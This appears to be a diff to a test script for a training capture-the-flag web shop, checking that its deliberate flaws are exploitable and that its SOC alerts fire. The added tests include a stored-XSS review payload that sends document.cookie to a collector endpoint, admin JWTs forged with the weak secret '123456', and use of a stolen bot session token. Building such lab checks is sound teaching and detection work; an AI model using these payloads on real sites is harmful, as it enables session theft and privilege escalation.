@@ -64,6 +64,18 @@ async function runTests() {
   // ==========================================
   // CH1: Cart Manipulation
   // ==========================================
+    // Check if frontend is running before waiting
+    try {
+      const http = require('http');
+      await new Promise((resolve, reject) => {
+        const req = http.get('http://localhost:5173', (res) => { res.on('data', ()=>{}); resolve(); });
+        req.on('error', reject);
+      });
+    } catch(err) {
+      console.error('❌ Shop frontend (localhost:5173) no está levantado. El bot no podrá visitarlo.');
+      process.exit(1);
+    }
+
   console.log('\nTesting CH1: Cart Manipulation...');
   // Add item to cart
   await request('POST', '/api/cart', { product_id: 12, quantity: 1 }, userToken);
@@ -104,18 +116,6 @@ async function runTests() {
       content: "<img src=x onerror='fetch(\"http://localhost:3000/api/ctf/collector?c=\"+document.cookie)'>",
       rating: 5
     }, userToken);
-
-    // Check if frontend is running before waiting
-    try {
-      const http = require('http');
-      await new Promise((resolve, reject) => {
-        const req = http.get('http://localhost:5173', (res) => { res.on('data', ()=>{}); resolve(); });
-        req.on('error', reject);
-      });
-    } catch(err) {
-      console.error('❌ Shop frontend (localhost:5173) no está levantado. El bot no podrá visitarlo.');
-      process.exit(1);
-    }
 
     // Wait up to 20s for the SOC alert
     let exfilFlag = null;
@@ -268,13 +268,208 @@ async function runTests() {
     await request('POST', '/api/sys/reset');
     
     // Check if token is still valid
-    const meRes = await request('GET', '/api/auth/me', null, token);
-    if (meRes.status !== 200) throw new Error('Token invalidated after reset (status ' + meRes.status + ')');
-    console.log('✅ Session persisted after reset');
+    
+    const io3 = require('socket.io-client');
+    const socket3 = io3('http://localhost:3000');
+    let falseAlarm = false;
+    let positiveAlarm = false; let meResStatus = 0;
+    
+    await new Promise(resolve => {
+      socket3.on('http-log', (log) => {
+        if (log.threats && log.threats.some(t => t.tag === 'Forged JWT')) {
+          if (log.url.includes('auth/me')) falseAlarm = true;
+          if (log.url.includes('positive-control')) positiveAlarm = true;
+        }
+      });
+      socket3.on('connect', async () => {
+        // Legitimate token request
+        meResStatus = (await request('GET', '/api/auth/me', null, token)).status;
+        if (meResStatus !== 200) console.error('meRes status:', meResStatus);
+        
+        // Positive control: request with missing jti forged token
+        const jwtObj = require('jsonwebtoken').decode(token);
+        const badToken = require('jsonwebtoken').sign({ id: jwtObj.id, role: 'admin' }, '123456');
+        await request('GET', '/api/orders?positive-control', null, badToken);
+        
+        setTimeout(() => resolve(), 500);
+      });
+    });
+    
+    socket3.disconnect();
+    if (falseAlarm) throw new Error('Legitimate token triggered Forged JWT after reset');
+    if (!positiveAlarm) throw new Error('Positive control failed: forged token did not trigger Forged JWT in persistence test');
+
+    if (meResStatus !== 200) throw new Error('Token invalidated after reset (status ' + meResStatus + ')');
+    
+    const jwtObj = require('jsonwebtoken').decode(token);
+    const D = require('../backend/node_modules/better-sqlite3');
+    const d = new D('backend/bugdrop.db',{readonly:true});
+    const row = d.prepare('SELECT * FROM issued_tokens WHERE jti=?').get(jwtObj.jti);
+    if (!row) throw new Error('JTI was deleted from database');
+    console.log('✅ Session persisted after reset and legitimate token triggered no Forged JWT alert');
   } catch (err) {
     console.error('❌ Session persistence failed:', err.message);
     process.exit(1);
   }
+
+    console.log('\n--- VALIDATING IDOR ALERTS ---');
+    const io4 = require('socket.io-client');
+    const socket4 = io4('http://localhost:3000');
+    let idorFired = false;
+    socket4.on('http-log', (log) => {
+      if (log.threats && log.threats.some(t => t.tag === 'IDOR')) idorFired = true;
+    });
+
+    // Test payment-info no auth -> 401
+    const pinfo1 = await request('GET', '/api/orders/1/payment-info');
+    if (pinfo1.status !== 401) throw new Error('payment-info without auth should be 401');
+
+    // Test payment-info wrong owner -> 403
+    const pinfo2 = await request('GET', '/api/orders/1/payment-info', null, userToken);
+    if (pinfo2.status !== 403) throw new Error('payment-info wrong owner should be 403');
+    
+    // Test orders/:id own owner -> NO IDOR alert
+    let idorFired2 = false;
+    const socket5 = require('socket.io-client')('http://localhost:3000');
+    
+    await new Promise(resolve => {
+      socket5.on('http-log', (log) => {
+        if (log.threats && log.threats.some(t => t.tag === 'IDOR')) idorFired2 = true;
+      });
+      socket5.on('connect', async () => {
+        const ownOrderRes = await request('GET', '/api/orders/2', null, userToken); // 2 is collector_42's order
+        setTimeout(() => resolve(), 500);
+      });
+    });
+    
+    if (idorFired2) throw new Error('orders/:id own owner should NOT trigger IDOR alert');
+    
+    // Test orders/:id wrong owner -> 200 + IDOR alert
+    idorFired2 = false;
+    const otherOrderRes = await request('GET', '/api/orders/1', null, userToken); // 4 is prof_doom's order
+    await new Promise(r => setTimeout(r, 500));
+    socket5.disconnect();
+    if (otherOrderRes.status !== 200) throw new Error('orders/:id wrong owner should be 200');
+    if (!idorFired2) throw new Error('orders/:id wrong owner should trigger IDOR alert');
+    console.log('✅ IDOR alerts on orders verified (own vs other)');
+
+  console.log('\n--- VALIDATING FORGED JWT ALERT (STEP 5) ---');
+  try {
+    const loginRes3 = await request('POST', '/api/auth/login', { username: 'collector_42', password: 'bugdrop2024' });
+    const userToken = loginRes3.data.token;
+    const jwtObj = require('jsonwebtoken').decode(userToken);
+    
+    // Forge token using user's jti but admin role
+    const forgedAdmin = require('jsonwebtoken').sign({
+      id: jwtObj.id,
+      username: jwtObj.username,
+      display_name: jwtObj.display_name,
+      role: 'admin',
+      jti: jwtObj.jti
+    }, '123456');
+    
+    // Use a quick socket connection to wait for the alert
+    const io2 = require('socket.io-client');
+    const socket2 = io2('http://localhost:3000');
+    let alertFired = false;
+    
+    await new Promise((resolve) => {
+      socket2.on('http-log', (log) => {
+        if (log.threats && log.threats.some(t => t.tag === 'Forged JWT')) {
+          alertFired = true;
+          socket2.disconnect();
+          resolve();
+        }
+      });
+      socket2.on('connect', () => {
+        request('GET', '/api/admin/dashboard', null, forgedAdmin).then(() => {
+          setTimeout(() => {
+            if(!alertFired) {
+               socket2.disconnect();
+               resolve();
+            }
+          }, 1000);
+        });
+      });
+    });
+    
+    if (!alertFired) {
+      throw new Error('Forged JWT with reused jti did not trigger SOC alert');
+    }
+    console.log('✅ Forged JWT with reused jti correctly triggers alert');
+    // Forge token without jti
+    const forgedNoJti = require('jsonwebtoken').sign({
+      id: jwtObj.id,
+      username: jwtObj.username,
+      display_name: jwtObj.display_name,
+      role: 'admin'
+    }, '123456');
+
+    let alertFiredNoJti = false;
+    const socket3 = require('socket.io-client')('http://localhost:3000');
+    await new Promise((resolve) => {
+      socket3.on('http-log', (log) => {
+        if (log.threats && log.threats.some(t => t.tag === 'Forged JWT')) {
+          alertFiredNoJti = true;
+          socket3.disconnect();
+          resolve();
+        }
+      });
+      socket3.on('connect', () => {
+        request('GET', '/api/admin/dashboard', null, forgedNoJti).then(() => {
+          setTimeout(() => { if(!alertFiredNoJti) { socket3.disconnect(); resolve(); } }, 1000);
+        });
+      });
+    });
+    if (!alertFiredNoJti) throw new Error('Forged JWT without jti did not trigger SOC alert');
+    console.log('✅ Forged JWT without jti triggers alert');
+
+  } catch (err) {
+    console.error('❌ Forged JWT test failed:', err.message);
+    process.exit(1);
+  }
+
+
+    // Extract token via XSS simulation like a real student
+    let stolenBotToken = null;
+    const socketBot = require('socket.io-client')('http://localhost:3000');
+    
+    await new Promise((resolve, reject) => {
+      let done = false;
+      const timeout = setTimeout(() => {
+        if (!done) reject(new Error('El bot no se ejecutó: ¿npx playwright install chromium?'));
+      }, 20000);
+      
+      socketBot.on('http-log', (log) => {
+        if (log.threats && log.threats.some(t => t.tag === 'Exfiltration')) {
+          const match = log.url.match(/session=([^&\s]+)/);
+          if (match) stolenBotToken = match[1];
+          done = true;
+          clearTimeout(timeout);
+          resolve();
+        }
+      });
+      socketBot.on('connect', () => {
+        request('POST', '/api/products/1/reviews', {
+          content: "<img src=x onerror='fetch(\"http://localhost:3000/api/ctf/collector?c=\"+document.cookie)'>",
+          rating: 5
+        }, userToken);
+      });
+    });
+    
+    if (!stolenBotToken) throw new Error('Could not extract stolen bot token from SOC log');
+    
+    let botFalseAlarm = false;
+    socketBot.on('http-log', (log) => {
+      if (log.threats && log.threats.some(t => t.tag === 'Forged JWT')) botFalseAlarm = true;
+    });
+    const dashRes = await request('GET', '/api/admin/dashboard', null, stolenBotToken);
+    await new Promise(r => setTimeout(r, 500));
+    socketBot.disconnect();
+    
+    if (botFalseAlarm) throw new Error('Legitimate bot token triggered Forged JWT alert');
+    if (!dashRes.data?.flag) throw new Error('Bot token did not receive admin flag');
+    console.log('✅ Stolen bot token from SOC log works without alert and gets flag');
 
   console.log('\n--- VALIDATING COLLECTOR NEGATIVE TESTS ---');
   try {
@@ -291,6 +486,19 @@ async function runTests() {
     const neg3 = await request('GET', `/api/ctf/collector?c=session=${validLoginToken}`);
     if (neg3.data?.flag) throw new Error('Collector gave flag for normal user token');
     
+    
+    
+    // Test collector with forged token reusing login jti (should not get flag)
+    const jwtObj3 = require('jsonwebtoken').decode(validLoginToken);
+    const forgedNeg = require('jsonwebtoken').sign({
+      id: jwtObj3.id,
+      username: jwtObj3.username,
+      display_name: jwtObj3.display_name,
+      role: 'admin',
+      jti: jwtObj3.jti
+    }, '123456');
+    const neg4 = await request('GET', `/api/ctf/collector?c=session=${forgedNeg}`);
+    if (neg4.data?.flag) throw new Error('Collector gave flag for forged token reusing login JTI');
     
     console.log('✅ Collector negative tests passed');
   } catch (err) {
